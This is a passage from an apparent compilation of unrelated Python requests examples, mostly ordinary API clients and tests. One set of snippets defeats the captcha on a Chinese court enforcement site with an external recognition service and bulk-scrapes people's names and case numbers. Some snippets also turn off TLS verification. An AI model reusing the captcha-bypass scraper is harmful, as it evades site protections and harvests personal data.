        headers.contract_address = self.channel_client.context.channel_manager.address
        if channel is not None:
            headers.balance = str(channel.balance)
            headers.balance_signature = encode_hex(channel.balance_sig)
            headers.sender_address = channel.sender
            headers.receiver_address = channel.receiver
            headers.open_block = str(channel.block)

        headers = HTTPHeaders.serialize(headers)
        if 'headers' in requests_kwargs:
            headers.update(requests_kwargs['headers'])
            requests_kwargs['headers'] = headers
        else:
            requests_kwargs['headers'] = headers
        return requests.request(method, url, **requests_kwargs) 
**************************************
def get(self, url, params=None, **kwargs):
        """
        Send a GET request.

        :param str url: Sub URL for the request. You MUST not specify neither base url nor api version prefix.
        :param dict params: (optional) Dictionary of query parameters.
        :param dict **kwargs: (optional) Other parameters which are directly passed to :func:`requests.request`.
        :return: Tuple of three elements: (http status code, headers, response - either parsed json or plain text)
        :rtype: tuple
        """

        return self.request('get', url, params=params, **kwargs) 
**************************************
def post(self, url, body=None, **kwargs):
        """
        Send a POST request.

        :param str url: Sub URL for the request. You MUST not specify neither base url nor api version prefix.
        :param dict body: (optional) Dictionary of body attributes that will be wrapped with envelope and json encoded.
        :param dict **kwargs: (optional) Other parameters which are directly passed to :func:`requests.request`.
        :return: Tuple of three elements: (http status code, headers, response - either parsed json or plain text)
        :rtype: tuple
        """

        return self.request('post', url, body=body, **kwargs) 
**************************************
def put(self, url, body=None, **kwargs):
        """
        Send a PUT request.

        :param str url: Sub URL for the request. You MUST not specify neither base url nor api version prefix.
        :param dict body: (optional) Dictionary of body attributes that will be wrapped with envelope and json encoded.
        :param dict **kwargs: (optional) Other parameters which are directly passed to :func:`requests.request`.
        :return: Tuple of three elements: (http status code, headers, response - either parsed json or plain text)
        :rtype: tuple
        """

        return self.request('put', url, body=body, **kwargs) 
**************************************
def delete(self, url, params=None, **kwargs):
        """
        Send a DELETE request.

        :param str url: Sub URL for the request. You MUST not specify neither base url nor api version prefix.
        :param dict params: (optional) Dictionary of query parameters.
        :param dict **kwargs: (optional) Other parameters which are directly passed to :func:`requests.request`.
        :return: Tuple of three elements: (http status code, headers, response - either parsed json or plain text)
        :rtype: tuple
        """

        return self.request('delete', url, params=params, **kwargs) 
**************************************
def get_captche_id():
    url = "http://zxgk.court.gov.cn/zhzxgk/index_form.do"
    response = requests.request("GET", url, headers=headers)
    response.encoding = response.apparent_encoding
    result = re.search(r'var captchaId = \'(.*)\';', response.text)
    print(result)
    if result:
        print(result.group(1))
        return result.group(1) 
**************************************
def recognize_image():
    url = "http://zxgk.court.gov.cn/zhzxgk/captcha.do"
    querystring = {"captchaId": captchaId, "random": random.uniform(0, 1)}
    while True:
        try:
            response = session.request("GET", url, headers=headers, timeout=6, params=querystring)
            if response.text:
                break
            else:
                print("retry, response.text is empty")
        except Exception as ee:
            print(ee)

        # 识别
    s = time.time()
    url = "http://10.18.81.102:6666/b"
    files = {'image_file': ('captcha.jpg', BytesIO(response.content), 'application')}
    r = session.post(url=url, files=files)
    e = time.time()

    # 识别结果
    print("接口响应: {}".format(r.text))
    predict_text = json.loads(r.text)["value"]
    now_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print("【{}】  耗时：{}ms 预测结果：{}".format(now_time, int((e - s) * 1000), predict_text))
    # # 保存文件
    # img_name = "{}_{}.{}".format(predict_text, str(time.time()).replace(".", ""), 'jpg')
    # path = os.path.join('./online/', img_name)
    # with open(path, "wb") as f:
    #     f.write(response.content)
    # print("============== end ==============")

    result = {
        'j_captcha': predict_text,
        'captchaId': captchaId
    }
    return result 
**************************************
def getPatient(self, UID):
	######################################
	# Purpose: dump Patient resource 
	# 	for a single patient
	#	
	##########################################
		mod = 'download_data.py:FHIR:getPatient'
		addon = 'Patient/' + UID
		url1 = self.url + addon

		import requests
		response = requests.request("GET", url1, headers=self.headers)
		return  response.text 
**************************************
def getCondition(self, PID) :
	######################################
	# Purpose: dump Condition resource 
	# 	for a single patient
	#	
	##########################################
		mod = 'download_data.py:FHIR:getCondition'
		addon = 'Condition?patient=' + PID
		url1 = self.url + addon

		import requests
		response = requests.request("GET", url1, headers=self.headers)
		return  response.text 
**************************************
def getImagingStudy (self, ID):
	######################################
	# Purpose: return teh imagingStudy FHIR object for 
	#  the indicated ID
	#
	########################################
		mod = 'download_data.py:FHIR:getImagingStudy'
		addon = 'ImagingStudy?_id=' + ID
		url1 = self.url + addon

		import requests, json
		response = requests.request("GET", url1, headers=self.headers)
		return  json.loads(response.text) 
**************************************
def getReport(self, PID, RID):
	######################################
	# Purpose: dump a report  
	# 	for a single patient
	#	
	##########################################
		mod = 'download_data.py:FHIR:getReport'
		addon = 'Patient/' + PID + '/' + RID
		url1 = self.url + addon

		import requests
		response = requests.request("GET", url1, headers=self.headers)
		return  response.text 
**************************************
def getPatient(self, ID):
	######################################
	# Purpose: return JSON list of all studies 
	# 		for patient ID in VNA
	#
	# Note: see example 	https://www.dicomstandard.org/dicomweb/query-qido-rs/
	##########################################
		mod = 'download_data.py:DCMweb:getSeries'
		addon = '/studies/?00100020=' + ID + '?fuzzymatching=true'
		url1 = self.url + addon

		import requests
		response = requests.request("GET", url1, headers=self.headers)
		return  response.text 
**************************************
def get_requests_kwargs(args):
    """Translate our `args` into `requests.request` keyword arguments."""

    implicit_headers = {
        'User-Agent': DEFAULT_UA
    }

    auto_json = args.data and not args.form
    # FIXME: Accept is set to JSON with `http url @./file.txt`.
    if args.json or auto_json:
        implicit_headers['Accept'] = 'application/json'
        if args.json or (auto_json and args.data):
            implicit_headers['Content-Type'] = JSON

        if isinstance(args.data, dict):
            if args.data:
                args.data = json.dumps(args.data)
            else:
                # We need to set data to an empty string to prevent requests
                # from assigning an empty list to `response.request.data`.
                args.data = ''

    elif args.form and not args.files:
        # If sending files, `requests` will set
        # the `Content-Type` for us.
        implicit_headers['Content-Type'] = FORM

    for name, value in implicit_headers.items():
        if name not in args.headers:
            args.headers[name] = value

    credentials = None
    if args.auth:
        auth_plugin = plugin_manager.get_auth_plugin(args.auth_type)()
        credentials = auth_plugin.get_auth(args.auth.key, args.auth.value)

    kwargs = {
        'stream': True,
        'method': args.method.lower(),
        'url': args.url,
        'headers': args.headers,
        'data': args.data,
        'verify': {
            'yes': True,
            'no': False
        }.get(args.verify, args.verify),
        'timeout': args.timeout,
        'auth': credentials,
        'proxies': dict((p.key, p.value) for p in args.proxy),
        'files': args.files,
        'allow_redirects': args.follow,
        'params': args.params,
    }

    return kwargs 
**************************************
def _make_call_to_kobra(payload):
    p = None
    liuid=None
    if 'liu_id' in payload:
        p = payload['liu_id']
        liuid = p
    elif 'rfid_number' in payload:
        p = payload['rfid_number']
    if p is None:
        raise LiuGetterError

    url = "https://kobra.karservice.se/api/v1/students/{}/".format(p)

    payload = ""
    token = str(os.environ.get('KOBRA_TOKEN'))
    headers = {
        'authorization': "Token {}".format(token),
        'content-type': "application/json",
        'cache-control': "no-cache",
    }

    response = requests.request("GET", url, data=payload, headers=headers)
    response.encoding = "utf-8"
    person = json.loads(response.text, encoding="utf-8")

    if 'detail' in person:
        if 'Invalid token' in person['detail']:
            raise LiuGetterError(person['detail'])
        raise LiuNotFoundError(person['detail'])
    if person['email'] == "None" and liuid:
        person['email'] = "{liuid}@student.liu.se".format(liuid=liuid)
    return _convert_new_to_old(person)


# def _make_call_to_old_kobra(payload):
#
#     user = str(os.environ.get('KOBRA_USER'))
#     password = str(os.environ.get('KOBRA_PASSWORD'))
#     adapter = SSLAdapter('SSLv23')
#     s = requests.Session()
#     s.mount('https://', adapter)
#
#     r = s.post("https://kobra.ks.liu.se/students/api", auth=(user, password), data=payload)
#     if not r.status_code == requests.codes.ok:
#         if r.status_code == 404:
#             raise LiuNotFoundError
#         else:
#             raise LiuGetterError
#     r.encoding = "iso-8859-1"
#     result_dict = json.loads(r.text, encoding="iso-8859-1")
#
#     return result_dict 
**************************************
def exam_result(course_code):
    url = "http://student.liu.se/tentaresult/?kurskod={}&provkod=&datum=&kursnamn=&sort=0&search=S%F6k".format(course_code)

    payload = ""
    headers = {
        'cache-control': "no-cache",
    }

    response = requests.request("GET", url, data=payload, headers=headers)
    response.encoding = "iso-8859-1"
    data = response.text.lower()
    lines = data.split("\n")

    l_nr = 0
    for l in lines:
        l_nr += 1
        if "beskrivning av tentamenstillfället" in l:
            break

    lines = lines[l_nr:]
    l_nr = 0
    for l in lines:
        if "<form" in l:
            break
        l_nr += 1
    lines = lines[:l_nr]
    lines.insert(0, "</tr>")
    lines.append("</table></td>")
    text = "".join(lines).replace("<br>", "<br />").replace('bgcolor="#ffffff"', 'bgcolor=""').replace('bgcolor="#ffffcc"', 'bgcolor=""')
    tables = text.split('</tr><tr valign="top" bgcolor="">')[1:]
    results = []
    for exam in tables:
        parts = exam.split("</td><td>", 1)
        info = parts[0][4:].split("<br />")
        if info[0].split(":")[0].upper() != course_code.upper():
            raise MultipleMatches
        result = {
            "course_code": info[0].split(":")[0].upper(),
            "course_name": info[0].split(":")[1].replace("  ", " ").replace("  ", " "),
            "exam_code":  info[1].split(":")[0].upper(),
            "exam_name": info[1].split(":")[1].replace("  ", " ").replace("  ", " "),
            "date": info[2].strip()
        }
        res = parts[1].replace('<table border="1" cellspacing="0" cellpadding="2"><tr><td><i>betyg</i></td><td><i>antal</i></td></tr><tr>', "").replace("</tr>", "").replace("</table>", "").split("<tr>")
        exam_results = {}
        for r in res:

            s = r.replace(" ", "").split("</td><td>")
            exam_results[s[0].replace("<td>", "").strip()] = s[1].replace("</td>", "")
        result["results"] = exam_results
        results.append(result)
    return results 
**************************************
def proxy(self, path: str, request: Request, tokens: dict) -> Tuple[str, int, dict]:
        # Discard unauthenticated users as soon as possible.
        if not _is_authenticated(tokens):
            return f'API Gateway: not authenticated', 401, {}

        # Check that this endpoint exists in the API/endpoint definition.
        api_def, endpoint_def = _get_defintions(self.api_definitions, path)
        if not endpoint_def or not api_def:
            return f'API Gateway: endpoint {path} is unknown', 404, {}

        policy = endpoint_def.authz  # Configured policy for this endpoint. Example: ADMIN_ONLY, DENY_ALL...
        allowed, reason = self.authz_controller.is_authorized(policy, tokens.get('id_token'))
        if not allowed:
            return f'API Gateway: you are not authorized to access the {path} endpoint: {reason}', 403, {}

        request_headers = dict(request.headers)
        del request_headers['Host']  # 'Host' will be set automatically.
        request_headers['Authorization'] = f'Bearer {_get_auth_token(tokens)}'  # Pass the JWT to downstream.

        logging.getLogger().info(
            f"proxy call {request.method} {api_def.host}/{path} (regex: {endpoint_def.path_regex})",
            extra={
                'method': request.method,
                'host': api_def.host,
                'path': path,
                'path_regex': endpoint_def.path_regex,
                'timeout': endpoint_def.timeout,
            })

        response = requests.request(
            method=request.method,
            url='/'.join([api_def.host, path]),
            params=dict(request.args),
            data=request.raw_content,
            headers=request_headers,
            timeout=endpoint_def.timeout,
            verify=api_def.cert,
        )

        def propagate(header: str):
            return _should_propagate_header(header, self.config.PROPAGATE_TO_CLIENT, endpoint_def)

        response_headers = dict((k, v) for k, v in response.headers.items() if propagate(k))

        return response.content, response.status_code, response_headers 
**************************************
def getResponse(self, authrize=None, timeout=30):
        #=======================================================================
        # 获取response结果
        #=======================================================================
        sys_parameters = {
            P_FORMAT: 'json',
            P_APPKEY: self.__app_key,
            P_SIGN_METHOD: "md5",
            P_VERSION: '2.0',
            P_TIMESTAMP: str(self.getTime()),
            P_PARTNER_ID: SYSTEM_GENERATE_VERSION,
            P_API: self.getapiname(),
        }
        if authrize is not None:
            sys_parameters[P_SESSION] = authrize
        application_parameter = self.getApplicationParameters()
        sign_parameter = sys_parameters.copy()
        sign_parameter.update(application_parameter)
        sys_parameters[P_SIGN] = sign(self.__secret, sign_parameter)
        sys_parameters.update(sign_parameter)

        header = self.get_request_header()
        result = requests.request(self.__httpmethod,self.__domain,data=sys_parameters,headers=header,timeout=timeout)
        #print(result.status_code, '===', result.text)
        if result.status_code is not 200:
            raise RequestException('invalid http status ' + str(result.status_code) + ',detail body:' + result.text)
        jsonobj = result.json()

        # if 'error_response' in jsonobj:
        #     error = TopException()
        #     if P_CODE in jsonobj["error_response"]:
        #         error.errorcode = jsonobj["error_response"][P_CODE]
        #     if P_MSG in jsonobj["error_response"]:
        #         error.message = jsonobj["error_response"][P_MSG]
        #     if P_SUB_CODE in jsonobj["error_response"]:
        #         error.subcode = jsonobj["error_response"][P_SUB_CODE]
        #     if P_SUB_MSG in jsonobj["error_response"]:
        #         error.submsg = jsonobj["error_response"][P_SUB_MSG]
        #     error.application_host = result.headers.get("Application-Host", "")
        #     error.service_host = result.headers.get("Location-Host", "")
        #     raise error
        #
        return jsonobj 
**************************************
def get_zhixing_list(pname, current_page=1):
    result = recognize_image()
    url = "http://zxgk.court.gov.cn/zhzxgk/newsearch"
    payload = {
        'currentPage': current_page,
        'searchCourtName': '全国法院（包含地方各级法院）',
        'selectCourtId': '0',
        'selectCourtArrange': '1',
        'pname': pname,
        'cardNum': '',
        'j_captcha': result.get('j_captcha'),
        'countNameSelect': '',
        'captchaId': result.get('captchaId')
    }

    response = session.request("POST", url, data=payload, headers=headers)
    while "验证码错误" in response.text:
        result = recognize_image()
        payload['j_captcha'] = result.get('j_captcha')
        response = session.request("POST", url, data=payload, headers=headers)
    else:
        temps = re.search('1/\d{1,4}', response.text).group()
        max_page = int(temps.replace('1/', ''))
        print("共{}页数据".format(max_page))

        for page in range(1, max_page + 1):
            print("*" * 100)
            print("正在爬取关键词{}第{}页数".format(pname, page))
            print("*" * 100)
            payload['currentPage'] = page
            response = session.request("POST", url, data=payload, headers=headers)
            while "验证码错误" in response.text:
                result = recognize_image()
                payload['j_captcha'] = result.get('j_captcha')
                response = session.request("POST", url, data=payload, headers=headers)
            else:
                html = etree.HTML(response.text)
                trs = html.xpath('//table/tbody/tr')
                for tr in trs[1:]:
                    tds = tr.xpath('.//td/text()')
                    print(tds)
                    name = tds[1]
                    case_no = tds[3]
                    print(name, result.get('j_captcha'), case_no, captchaId)
                    get_zhixing_detail(name, result.get('j_captcha'), case_no, captchaId) 
**************************************
def get_zhixing_detail(pnameNewDel, j_captchaNewDel, caseCodeNewDel, captchaIdNewDel):
    url = "http://zxgk.court.gov.cn/zhzxgk/newdetail?pnameNewDel={}&cardNumNewDel=&j_captchaNewDel={" \
          "}&caseCodeNewDel={}&captchaIdNewDel" \
          "={}".format(pnameNewDel, j_captchaNewDel, caseCodeNewDel, captchaIdNewDel)
    print(url)
    response = requests.request("GET", url, headers=headers)
    print(response.status_code)
    # try:
    #     print(response.text.replace(u'\xaf', u' ').replace(u'\xe5', u' '))
    # except Exception as e:
    #     print(e)
    html = etree.HTML(response.text.encode('utf-8', 'ignore'))
    while "验证码错误" in response.text:
        print("验证码错误，正在重试")
        result = recognize_image()
        get_zhixing_detail(pnameNewDel, result.get('j_captcha'), caseCodeNewDel, captchaIdNewDel)
    else:
        # 被执行人
        trs = html.xpath('//table[@id="bzxr"]/tr')
        if trs:
            print("被执行人")
            for tr in trs:
                tds = tr.xpath('.//td//strong/text()')
                tds_value = tr.xpath('.//td/text()')
                print(tds, tds_value)
        else:
            pass

        trs = html.xpath('//table[@id="zb"]/tr')
        if trs:
            print("终本案件")
            for tr in trs:
                tds = tr.xpath('.//td//strong/text()')
                tds_value = tr.xpath('.//td/text()')
                print(tds, tds_value)
        else:
            pass

        trs = html.xpath('//table[@id="xgl"]/tr')
        if trs:
            print("限制消费人员")
            for tr in trs:
                tds = tr.xpath('.//td//strong/text()')
                tds_value = tr.xpath('.//td/text()')
                print(tds, tds_value)
        else:
            pass

        if trs:
            print("失信被执行人")
            for tr in trs:
                tds = tr.xpath('.//td//strong/text()')
                tds_value = tr.xpath('.//td/text()')
                print(tds, tds_value)
        else:
            pass 

Python requests.ConnectionError() Examples

**************************************
def sendData():
    global projectName
    global userInsightfinder
    global licenseKey
    alldata["userName"] = userInsightfinder
    alldata["operation"] = "verify"
    alldata["licenseKey"] = licenseKey
    alldata["projectName"] = projectName
    json_data = json.dumps(alldata)
    #print json_data
    url = serverUrl + "/api/v1/agentdatahelper"
    print serverUrl
    try:
        response = requests.post(url, data = json.loads(json_data))
    except requests.ConnectionError, e:
        print "Connection failure : " + str(e)
        print "Verification with InsightFinder credentials Failed"
        sys.exit(1) 
**************************************
def sendData():
    global projectName
    global userInsightfinder
    global licenseKey
    alldata["userName"] = userInsightfinder
    alldata["operation"] = "verify"
    alldata["licenseKey"] = licenseKey
    alldata["projectName"] = projectName
    json_data = json.dumps(alldata)
    #print json_data
    url = serverUrl + "/api/v1/agentdatahelper"
    print serverUrl
    try:
        response = requests.post(url, data = json.loads(json_data))
    except requests.ConnectionError, e:
        print "Connection failure : " + str(e)
        print "Verification with InsightFinder credentials Failed"
        sys.exit(1) 
**************************************
def verifyUser(username, licenseKey, projectName):
    alldata = {}
    alldata["userName"] = username
    alldata["operation"] = "verify"
    alldata["licenseKey"] = licenseKey
    alldata["projectName"] = projectName
    toSendDataJSON = json.dumps(alldata)

    url = parameters['serverUrl'] + "/api/v1/agentdatahelper"

    try:
        response = requests.post(url, data=json.loads(toSendDataJSON))
    except requests.ConnectionError, e:
        logger.error("Connection failure : " + str(e))
        logger.error("Verification with InsightFinder credentials Failed")
        return False 
**************************************
def test_POST_nodata():
    '''The server should accept a POST and return 400 error on empty form.'''
    print("Testing POST request with empty form.")

    uri = "http://localhost:8000/"
    data = {}

    try:
        r = requests.post(uri, data=data, allow_redirects=False)
    except requests.ConnectionError as e:
        return ("Server dropped the connection. Step 1 or 5 isn't done yet?")

    if r.status_code == 501:
        return ("The server returned status code 501 Not Implemented.\n"
                "This means it doesn't know how to handle a POST request.\n"
                "(Is the correct server code running?)")
    elif r.status_code != 400:
        return ("Server returned status code {} instead of 400 when I gave\n"
                "it an empty form in a POST request.".format(r.status_code))
    else:
        print("POST request with bad URI correctly got a 400.")
        return None 
**************************************
def test_POST_bad():
    '''The server should accept a POST and return 404 error on bad URI.'''
    print("Testing POST request with bad URI.")

    uri = "http://localhost:8000/"
    data = {'shortname': 'bad', 'longuri': 'this is fake'}
    try:
        r = requests.post(uri, data=data, allow_redirects=False)
    except requests.ConnectionError as e:
        return ("Server dropped the connection. Step 1 or 5 isn't done yet?")

    if r.status_code == 501:
        return ("The server returned status code 501 Not Implemented.\n"
                "This means it doesn't know how to handle a POST request.\n"
                "(Is the correct server code running?)")
    elif r.status_code != 404:
        return ("Server returned status code {} instead of 404 when I gave\n"
                "it a bad URI in a POST request.".format(r.status_code))
    else:
        print("POST request with bad URI correctly got a 404.")
        return None 
**************************************
def _request(self, url, refresh=False, **params):
        if self.using_cache and refresh is False:  # refresh=True forces a request instead of using cache
            cache = self._resolve_cache(url, **params)
            if cache is not None:
                return cache
        method = params.get('method', 'GET')
        json_data = params.get('json', {})
        timeout = params.pop('timeout', None) or self.timeout
        if self.is_async:  # return a coroutine
            return self._arequest(url, **params)
        try:
            with self.session.request(
                method, url, timeout=timeout, headers=self.headers, params=params, json=json_data
            ) as resp:
                return self._raise_for_status(resp, resp.text, method=method)
        except requests.Timeout:
            raise NotResponding
        except requests.ConnectionError:
            raise NetworkError 
**************************************
def _request(self, url, refresh=False, **params):
        if self.using_cache and refresh is False:  # refresh=True forces a request instead of using cache
            cache = self._resolve_cache(url, **params)
            if cache is not None:
                return cache
        if self.ratelimit[1] == 0 and time() < self.ratelimit[2] / 1000:
            if not url.endswith('/auth/stats'):
                raise RatelimitErrorDetected(self.ratelimit[2] / 1000 - time())
        if self.is_async:  # return a coroutine
            return self._arequest(url, **params)
        timeout = params.pop('timeout', None) or self.timeout
        try:
            with self.session.get(url, timeout=timeout, headers=self.headers, params=params) as resp:
                return self._raise_for_status(resp, resp.text, method='GET')
        except requests.Timeout:
            raise NotResponding
        except requests.ConnectionError:
            raise NetworkError 
**************************************
def process_response(wrapped, instance, args, kwargs):
    """
    Decorator to process requests.Response

    Raises:
        Exception: Service Unavailable

    Returns:
        dict: json data
    """

    try:
        resp = wrapped(*args, **kwargs)

    except (requests.ConnectionError, requests.Timeout) as e:
        raise Exception("Service Unavailable") from e

    else:
        resp.raise_for_status()
        return resp.json() 
**************************************
def api_call_get(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.get(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_post(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.post(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_delete(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.delete(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if not api_result['success']:
            raise self.APIError(api_result['errors'])
        return api_result 
**************************************
def api_call_patch(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.patch(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_put(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.put(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        elif api_result['errors']:
            raise self.APIError(str(api_result['errors']))
        return api_result

    ################################################################
    #  Zone (https://api.cloudflare.com/#zone)                     #
    ################################################################

    #  Get all zones 
**************************************
def validate_response_app_endpoint(p_client, appId):
    ingress_list = p_client.list_ingress(namespaceId=appId).data
    assert len(ingress_list) == 1
    ingress = ingress_list[0]
    if hasattr(ingress, 'publicEndpoints'):
        for public_endpoint in ingress.publicEndpoints:
            url = \
                public_endpoint["protocol"].lower() + "://" + \
                public_endpoint["hostname"]
            print(url)
            try:
                r = requests.head(url)
                assert r.status_code == 200, \
                    "Http response is not 200. Failed to launch the app"
            except requests.ConnectionError:
                print("failed to connect")
                assert False, "failed to connect to the app" 
**************************************
def test_location_google_breaks(self):
        """User passed location arg but google api gave error"""
        caught_exceptions = [
            requests.ConnectionError, requests.HTTPError, requests.Timeout]
        with mock.patch('requests.get') as mock_get:
            for exception in caught_exceptions:
                mock_get.side_effect = exception
                with capture_sys_output():
                    with self.assertRaises(RipeAtlasToolsException):
                        cmd = Command()
                        cmd.init_args(["--location", "blaaaa"])
                        cmd.run()
            mock_get.side_effect = Exception()
            with self.assertRaises(Exception):
                cmd = Command()
                cmd.init_args(["--location", "blaaaa"])
                cmd.run() 
**************************************
def convert(ctx: commands.Context, url: str) -> str:
        """Convert url to Intersphinx inventory URL."""
        try:
            intersphinx.fetch_inventory(SphinxConfiguration(), '', url)
        except AttributeError:
            raise commands.BadArgument(f"Failed to fetch Intersphinx inventory from URL `{url}`.")
        except ConnectionError:
            if url.startswith('https'):
                raise commands.BadArgument(
                    f"Cannot establish a connection to `{url}`. Does it support HTTPS?"
                )
            raise commands.BadArgument(f"Cannot connect to host with URL `{url}`.")
        except ValueError:
            raise commands.BadArgument(
                f"Failed to read Intersphinx inventory from URL `{url}`. "
                "Are you sure that it's a valid inventory file?"
            )
        return url 
**************************************
def make_call(self, url, params=None):
        time.sleep(SLEEP_TIME)
        for i in range(10):
            if i != 0:
                self.logger.info("%s - retrying... %d" % (url,i))
                time.sleep(ERROR_SLEEP_TIME*i)
            try:
                res = requests.get(url, verify=False)
            except requests.ConnectionError, e:
                self.logger.info(e)
                continue
            
            if res.status_code == 200:
                #data = json.loads(res.text)
                data = res.json()
                if data:
                    return data
                continue

                
    #TODO: replace it with requests retry 
**************************************
def make_call_v2(self, url, params=None):
        time.sleep(SLEEP_TIME)
        for i in range(10):
            if i != 0:
                self.logger.info("%s - retrying... %d" % (url,i))
                time.sleep(ERROR_SLEEP_TIME*i)
            try:
                res = requests.get(url)
            except requests.ConnectionError, e:
                self.logger.info(e)
                continue
            
            if res.status_code == 200:
                #data = json.loads(res.text)
                data = res.json()
                return data 
**************************************
def fetch_info(id, type):
    """
    Returns a dictionary with information about the media(id, type).
    Currently only fetches 'members'(popularity count).
    """
    validate_media(type)

    url = media_url(id, type)

    try:
        response = requests.get(url)
        html = response.content
        return extract_info(html)
    except requests.ConnectionError:
        print(f"Timed out on fetching {type}:{id} info")
        return None
    except Exception as err:
        print(id, type, '-', response.status_code, '-', err)
        if response.status_code == 404:
            return []
        return None 
**************************************
def _get_remote_projects(self):
        # import when required in order to reduce watson response time (#312)
        import requests
        if not hasattr(self, '_remote_projects'):
            dest, headers = self._get_request_info('projects')

            try:
                response = requests.get(dest, headers=headers)
                assert response.status_code == 200

                self._remote_projects = response.json()
            except requests.ConnectionError:
                raise WatsonError("Unable to reach the server.")
            except AssertionError:
                raise WatsonError(
                    u"An error occurred with the remote "
                    "server: {}".format(response.json())
                )

        return self._remote_projects['projects'] 
**************************************
def get(self):

        work_list = []
        if requests.get('http://www.google.com'):
            work_list.append(build_working_response('google', 'working'))
            app.log.info('testing info log')
        else:
            work_list.append(build_working_response('google',
                                                    'error', 'another_dependency-api offline.', 'CODE02'))
            app.log.error('testing ERROR log')

        try:
            if requests.get('http://localhost:8000') == 200:
                work_list.append(build_working_response('localhost', 'working'))
                app.log.info('testing info log')
            else:
                work_list.append(build_working_response('localhost',
                                                        'error', 'another_dependency-api offline.', 'CODE02'))
                app.log.error('testing ERROR log')
        except requests.ConnectionError as e:
            work_list.append(build_working_response('localhost',
                                                    'error', str(e), 'CODE04'))
            app.log.error(e)
        return work_list, 200 
**************************************
def _make_request(self, path, cni_envs, expected_status=None):
        method = 'POST'

        address = config.CONF.cni_daemon.bind_address
        url = 'http://%s/%s' % (address, path)
        try:
            LOG.debug('Making request to CNI Daemon. %(method)s %(path)s\n'
                      '%(body)s',
                      {'method': method, 'path': url, 'body': cni_envs})
            resp = requests.post(url, json=cni_envs,
                                 headers={'Connection': 'close'})
        except requests.ConnectionError:
            LOG.exception('Looks like %s cannot be reached. Is kuryr-daemon '
                          'running?', address)
            raise
        LOG.debug('CNI Daemon returned "%(status)d %(reason)s".',
                  {'status': resp.status_code, 'reason': resp.reason})
        if expected_status and resp.status_code != expected_status:
            LOG.error('CNI daemon returned error "%(status)d %(reason)s".',
                      {'status': resp.status_code, 'reason': resp.reason})
            raise k_exc.CNIError('Got invalid status code from CNI daemon.')
        return resp 
**************************************
def request(self, method, url, **kwargs):
        api_error_class = kwargs.pop('api_error_class', APIError)
        handle_errors = bool(kwargs.pop('handle_errors', True))
        try:
            resp = super(APISession, self).request(method, url, **kwargs)
        except requests.ConnectionError as ce:
            host = urlparse(ce.request.url).netloc
            if 'Connection refused' in str(ce):
                six.raise_from(CLIException(
                    'Unable to connect to {host} (connection refused); try again soon.'.format(host=host)
                ), ce)
            raise

        if handle_errors and resp.status_code >= 400:
            cls = (APINotFoundError if resp.status_code == 404 else api_error_class)
            raise cls(resp)
        return resp 
**************************************
def api_delete(server_name, api, session_id):
    #Header and URL for delete call
    headers = {'content-type': 'application/json',
               'cookie': 'JSESSIONID='+session_id }

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.delete(url, headers=headers, verify=False)
    except requests.ConnectionError:
        raise TintrRequestsiApiException("API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Request timed out.")
    except:
        raise TintriRequestsException("An unexpected error " + sys.exc_info()[0] + " occurred.")

    return r


# PUT 
**************************************
def api_put(server_name, api, payload, session_id):
    headers = {'content-type': 'application/json',
               'cookie': 'JSESSIONID='+session_id }

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.put(url, data=json.dumps(payload),
                         headers=headers, verify=False)
    except requests.ConnectionError:
        raise TintriRequestsException("API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Request timed out.")
    except:
        raise TintriRequestsException("An unexpected error " + sys.exc_info()[0] + " occurred.")

    return r


# POST 
**************************************
def api_post(server_name, api, payload, session_id):
    headers = {'content-type': 'application/json',
               'cookie': 'JSESSIONID='+session_id }

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
